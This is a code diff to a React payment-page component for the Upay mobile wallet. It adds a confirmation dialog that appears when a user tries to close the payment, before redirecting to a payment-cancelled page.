@@ -5,6 +5,7 @@ import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import { useReferrerGuard } from "@/hooks/useReferrerGuard";
 import DualCircleLoader from "@/components/DualCircleLoader";
 import upayLogo from "@/assets/upay-logo-full.svg";
+import CancelPaymentDialog from "@/components/CancelPaymentDialog";
 
 const UpayPayment = () => {
   const navigate = useNavigate();
@@ -20,6 +21,7 @@ const UpayPayment = () => {
   const [otpAttempts, setOtpAttempts] = useState(0);
   const [pinAttempts, setPinAttempts] = useState(0);
   const [isLoading, setIsLoading] = useState(false);
+  const [showCancelDialog, setShowCancelDialog] = useState(false);
 
   const mobileRef = useRef<HTMLInputElement>(null);
   const otpRef = useRef<HTMLInputElement>(null);
@@ -98,6 +100,9 @@ const UpayPayment = () => {
   };
 
   const handleClose = () => {
+    setShowCancelDialog(true);
+  };
+  const handleConfirmCancel = () => {
     navigate(`/payment-cancelled?channel=Upay&reason=Payment isn't completed&amount=${amount}`);
   };
 
@@ -187,6 +192,7 @@ const UpayPayment = () => {
           <span className="text-[#0054A5] font-extrabold text-base">16268</span>
         </div>
       </div>
+      <CancelPaymentDialog open={showCancelDialog} onOpenChange={setShowCancelDialog} onConfirmCancel={handleConfirmCancel} />
     </div>
   );
 };
